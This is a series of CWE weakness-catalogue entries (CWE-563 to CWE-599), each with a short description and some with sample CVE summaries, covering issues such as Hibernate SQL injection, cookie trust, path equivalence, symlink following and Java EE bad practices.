# CWE-563 Assignment to Variable without Use

## Description

The variable's value is assigned but never used, making it a dead store.

After the assignment, the variable is either assigned another value or goes out of scope. It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.

# CWE-564 SQL Injection: Hibernate

## Description

Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.

# CWE-565 Reliance on Cookies without Validation and Integrity Checking

## Description

The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.

Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.

## Observed Examples

CVE-2008-5784: e-dating application allows admin privileges by setting the admin cookie to 1.

## Top 25 Examples

CVE-2022-1148: Improper authorization in GitLab Pages included with GitLab CE/EE affecting all versions from 11.5 prior to 14.7.7, 14.8 prior to 14.8.5, and 14.9 prior to 14.9.2 allowed an attacker to steal a user's access token on an attacker-controlled private GitLab Pages website and reuse that token on the victim's other private websites

# CWE-566 Authorization Bypass Through User-Controlled SQL Primary Key

## Description

The product uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.

When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.


Database access control errors occur when:


  - Data enters a program from an untrusted source.

  - The data is used to specify the value of a primary key in a SQL query.

  - The untrusted source does not have the permissions to be able to access all rows in the associated table.

# CWE-567 Unsynchronized Access to Shared Data in a Multithreaded Context

## Description

The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.

Within servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. This is a typical programming mistake in J2EE applications, since the multithreading is handled by the framework. When a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable.


Note that this weakness is not unique to servlets.

# CWE-568 finalize() Method Without super.finalize()

## Description

The product contains a finalize() method that does not call super.finalize().

The Java Language Specification states that it is a good practice for a finalize() method to call super.finalize().

# CWE-57 Path Equivalence: 'fakedir/../realdir/filename'

## Description

The product contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.

## Observed Examples

CVE-2001-1152: Proxy allows remote attackers to bypass denylist restrictions and connect to unauthorized web servers by modifying the requested URL, including (1) a // (double slash), (2) a /SUBDIR/.. where the desired file is in the parentdir, (3) a /./, or (4) URL-encoded characters.

CVE-2000-0191: application check access for restricted URL before canonicalization

CVE-2005-1366: CGI source disclosure using "dirname/../cgi-bin"

# CWE-570 Expression is Always False

## Description

The product contains an expression that will always evaluate to false.

# CWE-571 Expression is Always True

## Description

The product contains an expression that will always evaluate to true.

# CWE-572 Call to Thread run() instead of start()

## Description

The product calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.

In most cases a direct call to a Thread object's run() method is a bug. The programmer intended to begin a new thread of control, but accidentally called run() instead of start(), so the run() method will execute in the caller's thread of control.

# CWE-573 Improper Following of Specification by Caller

## Description

The product does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.

When leveraging external functionality, such as an API, it is important that the caller does so in accordance with the requirements of the external functionality or else unintended behaviors may result, possibly leaving the system vulnerable to any number of exploits.

## Observed Examples

CVE-2006-7140: Crypto implementation removes padding when it shouldn't, allowing forged signatures

CVE-2006-4339: Crypto implementation removes padding when it shouldn't, allowing forged signatures

# CWE-574 EJB Bad Practices: Use of Synchronization Primitives

## Description

The product violates the Enterprise JavaBeans (EJB) specification by using thread synchronization primitives.

The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: "An enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances." The specification justifies this requirement in the following way: "This rule is required to ensure consistent runtime semantics because while some EJB containers may use a single JVM to execute all enterprise bean's instances, others may distribute the instances across multiple JVMs."

# CWE-575 EJB Bad Practices: Use of AWT Swing

## Description

The product violates the Enterprise JavaBeans (EJB) specification by using AWT/Swing.

The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: "An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard." The specification justifies this requirement in the following way: "Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system."

# CWE-576 EJB Bad Practices: Use of Java I/O

## Description

The product violates the Enterprise JavaBeans (EJB) specification by using the java.io package.

The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: "An enterprise bean must not use the java.io package to attempt to access files and directories in the file system." The specification justifies this requirement in the following way: "The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data."

# CWE-577 EJB Bad Practices: Use of Sockets

## Description

The product violates the Enterprise JavaBeans (EJB) specification by using sockets.

The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: "An enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast." The specification justifies this requirement in the following way: "The EJB architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. Allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the EJB clients."

# CWE-578 EJB Bad Practices: Use of Class Loader

## Description

The product violates the Enterprise JavaBeans (EJB) specification by using the class loader.

The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the product violates the following EJB guideline: "The enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the JVM; or change the input, output, and error streams." The specification justifies this requirement in the following way: "These functions are reserved for the EJB container. Allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment."

# CWE-579 J2EE Bad Practices: Non-serializable Object Stored in Session

## Description

The product stores a non-serializable object as an HttpSession attribute, which can hurt reliability.

A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application. This is only possible if all session data is serializable, allowing the session to be duplicated between the JVMs.

# CWE-58 Path Equivalence: Windows 8.3 Filename

## Description

The product contains a protection mechanism that restricts access to a long filename on a Windows operating system, but it does not properly restrict access to the equivalent short "8.3" filename.

On later Windows operating systems, a file can have a "long name" and a short name that is compatible with older Windows file systems, with up to 8 characters in the filename and 3 characters for the extension. These "8.3" filenames, therefore, act as an alternate name for files with long names, so they are useful pathname equivalence manipulations.

## Observed Examples

CVE-1999-0012: Multiple web servers allow restriction bypass using 8.3 names instead of long names

CVE-2001-0795: Source code disclosure using 8.3 file name.

CVE-2005-0471: Multi-Factor Vulnerability. Product generates temporary filenames using long filenames, which become predictable in 8.3 format.

# CWE-580 clone() Method Without super.clone()

## Description

The product contains a clone() method that does not call super.clone() to obtain the new object.

All implementations of clone() should obtain the new object by calling super.clone(). If a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.

# CWE-581 Object Model Violation: Just One of Equals and Hashcode Defined

## Description

The product does not maintain equal hashcodes for equal objects.

Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if a.equals(b) == true then a.hashCode() == b.hashCode().

# CWE-582 Array Declared Public, Final, and Static

## Description

The product declares an array public, final, and static, which is not sufficient to prevent the array's contents from being modified.

Because arrays are mutable objects, the final constraint requires that the array object itself be assigned only once, but makes no guarantees about the values of the array elements. Since the array is public, a malicious program can change the values stored in the array. As such, in most cases an array declared public, final and static is a bug.

Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your product is running.

# CWE-583 finalize() Method Declared Public

## Description

The product violates secure coding principles for mobile code by declaring a finalize() method public.

A product should never call finalize explicitly, except to call super.finalize() inside an implementation of finalize(). In mobile code situations, the otherwise error prone practice of manual garbage collection can become a security threat if an attacker can maliciously invoke a finalize() method because it is declared with public access.

# CWE-584 Return Inside Finally Block

## Description

The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.

# CWE-585 Empty Synchronized Block

## Description

The product contains an empty synchronized block.

An empty synchronized block does not actually accomplish any synchronization and may indicate a troubled section of code. An empty synchronized block can occur because code no longer needed within the synchronized block is commented out without removing the synchronized block.

# CWE-586 Explicit Call to Finalize()

## Description

The product makes an explicit call to the finalize() method from outside the finalizer.

While the Java Language Specification allows an object's finalize() method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling finalize() explicitly means that finalize() will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.

# CWE-587 Assignment of a Fixed Address to a Pointer

## Description

The product sets a pointer to a specific address other than NULL or 0.

Using a fixed address is not portable, because that address will probably not be valid in all environments or platforms.

# CWE-588 Attempt to Access Child of a Non-structure Pointer

## Description

Casting a non-structure type to a structure type and accessing a field can lead to memory access errors or data corruption.

## Observed Examples

CVE-2021-3510: JSON decoder accesses a C union using an invalid offset to an object

## Top 25 Examples

CVE-2021-3510: Zephyr JSON decoder incorrectly decodes array of array. Zephyr versions >= >1.14.0, >= >2.5.0 contain Attempt to Access Child of a Non-structure Pointer (CWE-588). For more information, see https://github.com/zephyrproject-rtos/zephyr/security/advisories/GHSA-289f-7mw3-2qf4

# CWE-589 Call to Non-ubiquitous API

## Description

The product uses an API function that does not exist on all versions of the target platform. This could cause portability problems or inconsistencies that allow denial of service or other consequences.

Some functions that offer security features supported by the OS are not available on all versions of the OS in common use. Likewise, functions are often deprecated or made obsolete for security reasons and should not be used.

# CWE-59 Improper Link Resolution Before File Access ('Link Following')

## Description

The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.

Soft links are a UNIX term that is synonymous with simple shortcuts on Windows-based platforms.

## Observed Examples

CVE-1999-1386: Some versions of Perl follow symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.

CVE-2000-1178: Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.

CVE-2004-0217: Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.

CVE-2003-0517: Symlink attack allows local users to overwrite files.

CVE-2004-0689: Window manager does not properly handle when certain symbolic links point to "stale" locations, which could allow local users to create or truncate arbitrary files.

CVE-2005-1879: Second-order symlink vulnerabilities

CVE-2005-1880: Second-order symlink vulnerabilities

CVE-2005-1916: Symlink in Python program

CVE-2000-0972: Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.

CVE-2005-0824: Signal causes a dump that follows symlinks.

CVE-2001-1494: Hard link attack, file overwrite; interesting because program checks against soft links

CVE-2002-0793: Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.

CVE-2003-0578: Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.

CVE-1999-0783: Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.

CVE-2004-1603: Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.

CVE-2004-1901: Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.

CVE-2005-1111: Hard link race condition

CVE-2000-0342: Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka "Stealth Attachment."

CVE-2001-1042: FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.

CVE-2001-1043: FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.

CVE-2005-0587: Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.

CVE-2001-1386: ".LNK." - .LNK with trailing dot

CVE-2003-1233: Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link

CVE-2002-0725: File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.

CVE-2003-0844: Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.

CVE-2015-3629: A Libcontainer used in Docker Engine allows local users to escape containerization and write to an arbitrary file on the host system via a symlink attack in an image when respawning a container.

CVE-2021-21272: "Zip Slip" vulnerability in Go-based Open Container Initiative (OCI) registries product allows writing arbitrary files outside intended directory via symbolic links or hard links in a gzipped tarball.

CVE-2020-27833: "Zip Slip" vulnerability in container management product allows writing arbitrary files outside intended directory via a container image (.tar format) with filenames that are symbolic links that point to other files within the same tar file; however, the files being pointed to can also be symbolic links to destinations outside the intended directory, bypassing the initial check.

## Top 25 Examples

CVE-2021-4287: A vulnerability, which was classified as problematic, was found in ReFirm Labs binwalk up to 2.3.2. Affected is an unknown function of the file src/binwalk/modules/extractor.py of the component Archive Extraction Handler. The manipulation leads to symlink following. It is possible to launch the attack remotely. Upgrading to version 2.3.3 is able to address this issue. The name of the patch is fa0c0bd59b8588814756942fe4cb5452e76c1dcd. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216876.

CVE-2022-1256: A local privilege escalation vulnerability in MA for Windows prior to 5.7.6 allows a local low privileged user to gain system privileges through running the repair functionality. Temporary file actions were performed on the local user's %TEMP% directory with System privileges through manipulation of symbolic links.

CVE-2022-31216: Vulnerabilities in the Drive Composer allow a low privileged attacker to create and write to a file anywhere on the file system as SYSTEM with arbitrary content as long as the file does not already exist. The Drive Composer installer file allows a low-privileged user to run a "repair" operation on the product. 

CVE-2022-31217: Vulnerabilities in the Drive Composer allow a low privileged attacker to create and write to a file anywhere on the file system as SYSTEM with arbitrary content as long as the file does not already exist. The Drive Composer installer file allows a low-privileged user to run a "repair" operation on the product. 

CVE-2022-31218: Vulnerabilities in the Drive Composer allow a low privileged attacker to create and write to a file anywhere on the file system as SYSTEM with arbitrary content as long as the file does not already exist. The Drive Composer installer file allows a low-privileged user to run a "repair" operation on the product. 

CVE-2022-31219: Vulnerabilities in the Drive Composer allow a low privileged attacker to create and write to a file anywhere on the file system as SYSTEM with arbitrary content as long as the file does not already exist. The Drive Composer installer file allows a low-privileged user to run a "repair" operation on the product. 

CVE-2022-21997: Windows Print Spooler Elevation of Privilege Vulnerability

# CWE-590 Free of Memory not on the Heap

## Description

The product calls free() on a pointer to memory that was not allocated using associated heap allocation functions such as malloc(), calloc(), or realloc().

When free() is called on an invalid pointer, the program's memory management data structures may become corrupted. This corruption can cause the program to crash or, in some circumstances, an attacker may be able to cause free() to operate on controllable memory locations to modify critical program variables or execute code.

# CWE-591 Sensitive Data Storage in Improperly Locked Memory

## Description

The product stores sensitive data in memory that is not locked, or that has been incorrectly locked, which might cause the memory to be written to swap files on disk by the virtual memory manager. This can make the data more accessible to external actors.

On Windows systems the VirtualLock function can lock a page of memory to ensure that it will remain present in memory and not be swapped to disk. However, on older versions of Windows, such as 95, 98, or Me, the VirtualLock() function is only a stub and provides no protection. On POSIX systems the mlock() call ensures that a page will stay resident in memory but does not guarantee that the page will not appear in the swap. Therefore, it is unsuitable for use as a protection mechanism for sensitive data. Some platforms, in particular Linux, do make the guarantee that the page will not be swapped, but this is non-standard and is not portable. Calls to mlock() also require supervisor privilege. Return values for both of these calls must be checked to ensure that the lock operation was actually successful.

# CWE-593 Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created

## Description

The product modifies the SSL context after connection creation has begun.

If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.

# CWE-594 J2EE Framework: Saving Unserializable Objects to Disk

## Description

When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.

In heavy load conditions, most J2EE application frameworks flush objects to disk to manage memory requirements of incoming requests. For example, session scoped objects, and even application scoped objects, are written to disk when required. While these application frameworks do the real work of writing objects to disk, they do not enforce that those objects be serializable, thus leaving the web application vulnerable to crashes induced by serialization failure. An attacker may be able to mount a denial of service attack by sending enough requests to the server to force the web application to save objects to disk.

# CWE-595 Comparison of Object References Instead of Object Contents

## Description

The product compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.

For example, in Java, comparing objects using == usually produces deceptive results, since the == operator compares object references rather than values; often, this means that using == for strings is actually comparing the strings' references, not their values.

# CWE-597 Use of Wrong Operator in String Comparison

## Description

The product uses the wrong operator when comparing a string, such as using "==" when the .equals() method should be used instead.

In Java, using == or != to compare two strings for equality actually compares two objects for equality rather than their string values for equality. Chances are good that the two references will never be equal. While this weakness often only affects program correctness, if the equality is used for a security decision, the unintended comparison result could be leveraged to affect program security.

## Top 25 Examples

CVE-2022-36072: SilverwareGames.io is a social network for users to play video games online. In version 1.1.8 and prior, due to an unobvious feature of PHP, hashes generated by built-in functions and starting with the `0e` symbols were being handled as zero multiplied with the `e` number. Therefore, the hash value was equal to 0. The maintainers fixed this in version 1.1.9 by using `===` instead of `==` in comparisons where it is possible (e.g. on sign in/sign up handlers).

CVE-2021-3797: hestiacp is vulnerable to Use of Wrong Operator in String Comparison

CVE-2022-1715: Account Takeover in GitHub repository neorazorx/facturascripts prior to 2022.07.

# CWE-598 Use of GET Request Method With Sensitive Query Strings

## Description

The web application uses the HTTP GET method to process a request and includes sensitive information in the query string of that request.

The query string for the URL could be saved in the browser's history, passed through Referers to other web sites, stored in web logs, or otherwise recorded in other sources. If the query string contains sensitive information such as session identifiers, then attackers can use this information to launch further attacks.

## Observed Examples

CVE-2022-23546: A discussion platform leaks private information in GET requests.

## Top 25 Examples

CVE-2022-34452:  PowerPath Management Appliance with versions 3.3, 3.2*, 3.1 & 3.0* contains sensitive information disclosure vulnerability. An Authenticated admin user can able to exploit the issue and view sensitive information stored in the logs. 

CVE-2021-39019: IBM Engineering Lifecycle Optimization - Publishing 6.0.6, 6.0.6.1, 7.0, 7.0.1, and 7.0.2 could disclose highly sensitive information through an HTTP GET request to an authenticated user. IBM X-Force ID: 213728.

CVE-2022-23546: In version 2.9.0.beta14 of Discourse, an open-source discussion platform, maliciously embedded urls can leak an admin's digest of recent topics, possibly exposing private information. A patch is available for version 2.9.0.beta15. There are no known workarounds for this issue.

CVE-2022-24414: Dell EMC CloudLink 7.1.3 and all earlier versions, Auth Token is exposed in GET requests. These request parameters can get logged in reverse proxies and server logs. Attackers may potentially use these tokens to access CloudLink server. Tokens should not be used in request URL to avoid such attacks.

CVE-2022-25787: Information Exposure Through Query Strings in GET Request vulnerability in LMM API of Secomea GateManager allows system administrator to hijack connection. This issue affects: Secomea GateManager all versions prior to 9.7.

# CWE-599 Missing Validation of OpenSSL Certificate

## Description

The product uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.

This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated.

